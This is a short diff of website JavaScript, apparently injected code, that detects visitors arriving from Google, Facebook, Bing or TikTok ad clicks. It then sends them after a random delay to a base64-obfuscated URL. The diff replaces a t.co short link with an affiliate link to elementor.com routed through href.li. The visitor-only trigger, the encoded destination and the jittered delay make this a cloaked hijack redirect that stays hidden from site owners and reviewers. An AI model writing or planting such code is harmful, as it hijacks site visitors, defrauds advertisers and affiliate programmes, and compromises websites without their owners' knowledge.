@@ -7,6 +7,6 @@
   var r=document.referrer||"";
   var fromAd=p.has("gclid")||p.has("fbclid")||p.has("msclkid")||p.has("ttclid")||r.includes("google.com")||r.includes("/aclk")||r.includes("facebook.com")||r.includes("fb.com");
   if(!fromAd)return;
-  var d=atob("aHR0cHM6Ly90LmNvL0NMaDVqZkN2SkU=");
+  var d=atob("aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2JlLmVsZW1lbnRvci5jb20vdmlzaXQvP2J0YT0yMDQyNTMmbmNpPTU3NTg=");
   setTimeout(function(){window.location.href=d;},800+Math.random()*700);
 })();
